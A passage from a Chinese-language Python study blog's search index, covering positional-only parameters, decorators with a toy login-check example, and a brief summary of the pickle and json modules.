+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(pos_only=<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;pos_only&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>下面的函数定义中，<code>kwds</code> 把 <code>name</code> 当作键，因此，可能与位置参数 <code>name</code> 产生潜在冲突：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, **kwds</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br></pre></td></tr></table></figure>
+
+<p>调用该函数不可能返回 <code>True</code>，因为关键字 <code>&#39;name&#39;</code> 总与第一个形参绑定。例如：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: foo() got multiple values <span class="keyword">for</span> argument <span class="string">&#x27;name&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>加上 <code>/</code> （仅限位置参数）后，就可以了。此时，函数定义把 <code>name</code> 当作位置参数，<code>&#39;name&#39;</code> 也可以作为关键字参数的键：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, /, **kwds</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>换句话说，仅限位置形参的名称可以在 <code>**kwds</code> 中使用，而不产生歧义。</p>
+<p><strong>取自python官方文档</strong></p>
+<h1 id="二、装饰器"><a href="#二、装饰器" class="headerlink" title="二、装饰器"></a>二、装饰器</h1><p>可以通过修饰去简化代码并且达到相应的目的。</p>
+<h2 id="1、装饰器雏形"><a href="#1、装饰器雏形" class="headerlink" title="1、装饰器雏形"></a>1、装饰器雏形</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guanjia</span>(<span class="params">game</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打开外挂&quot;</span>)</span><br><span class="line">        game()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;关闭外挂&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_dnf</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊！我叫赛利亚，今天又是美好的一天！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@guanjia</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_lol</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎来到英雄联盟&quot;</span>)</span><br><span class="line"></span><br><span class="line">play_lol()</span><br></pre></td></tr></table></figure>
+
+<p>这就是一个简单的装饰器，通过这种方法就能使我们更方便的对函数进行相关的加装以及优化，</p>
+<h2 id="2、装饰器的简单应用"><a href="#2、装饰器的简单应用" class="headerlink" title="2、装饰器的简单应用"></a>2、装饰器的简单应用</h2><p>在一些程序应用当中，我们会需要利用到登入的操作，这个时候我们就会想要实现，去实现什么功能之前需要先登入，这个时候装饰器就有用武之地了。不多说，直接看个小案例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">login_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_verify</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">global</span> login_flag</span><br><span class="line">        <span class="keyword">if</span> login_flag:</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;请先登录&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;还未完成用户登录操作&#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                username = <span class="built_in">input</span>(<span class="string">&#x27;请输入用户名：&#x27;</span>)</span><br><span class="line">                password = <span class="built_in">input</span>(<span class="string">&#x27;请输入密码：&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;登录成功&#x27;</span>)</span><br><span class="line">                    login_flag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;用户名或密码错误，请重新输入&#x27;</span>)</span><br><span class="line">            ret = fn(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到首页&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的订单&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的资料&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index()</span><br><span class="line">order()</span><br><span class="line">profile()</span><br></pre></td></tr></table></figure>
+
+<p>之后的相应是</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PS C:\VScodeproject&gt; &amp; C:/Users/ASUS/AppData/Local/Programs/Python/Python310/python.exe c:/VScodeproject/python/python-study/装饰器应用.py</span><br><span class="line">请先登录</span><br><span class="line">还未完成用户登录操作</span><br><span class="line">请输入用户名：admin</span><br><span class="line">请输入密码：<span class="number">123456</span></span><br><span class="line">登录成功</span><br><span class="line">欢迎来到首页</span><br><span class="line">欢迎来到我的订单</span><br><span class="line">欢迎来到我的资料</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、Pickle和Json模块的总结"><a href="#三、Pickle和Json模块的总结" class="headerlink" title="三、Pickle和Json模块的总结"></a>三、Pickle和Json模块的总结</h1><p>Pickle是将对象（数据）转化为字节，json是将对象（数据）转化为json格式</p>
+<blockquote>
+<p>1、dumps    把对象（数据）转化为字节</p>
+<p>2、loads       把字节转化回对象（数据）</p>
+<p>3、dump      把对象序列化成字节之后写入到文件</p>
+<p>3、load         把文件中的字节反序列化成对象 </p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
       </tags>
   </entry>
 </search>
